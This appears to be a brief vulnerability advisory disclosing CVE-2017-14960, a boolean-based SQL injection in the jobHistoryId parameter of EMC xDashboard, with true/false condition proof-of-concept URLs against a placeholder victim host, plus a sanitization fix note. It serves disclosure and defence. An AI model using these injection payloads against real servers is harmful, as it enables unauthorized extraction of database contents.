@@ -1,0 +1,41 @@
+Title: EMC xDashboard - SQL Injection Vulnerability
+Author: Pawel Gocyla
+Date: 02 January 2018
+
+CVE: CVE-2017-14960
+
+
+Affected Software:
+==================
+EMC xPression v4.5SP1 Patch 13
+Probably other versions are also vulnerable.
+
+
+SQL Injection Vulnerability:
+==============================
+This vulnerability allows an attacker to retrieve information from the
+database
+
+Vulnerable parameter: "$model.jobHistoryId"
+
+Exploit:
+
+True Condition:  https://[victim]:4000/xDashboard/html/jobhistory/
+jobDocHistoryList.action?model.jobHistoryId=1736687378927012979202234841133
+and 1=1
+False Condition: https://[victim]:4000/xDashboard/html/jobhistory/
+jobDocHistoryList.action?model.jobHistoryId=1736687378927012979202234841133
+and 1=2
+
+Fix:
+====
+User input which is putted into sql queries should be properly filtred or
+sanitized
+
+References:
+============
+https://www.owasp.org/index.php/SQL_Injection
+
+Contact:
+========
+pawellgocyla[at]gmail[dot]com
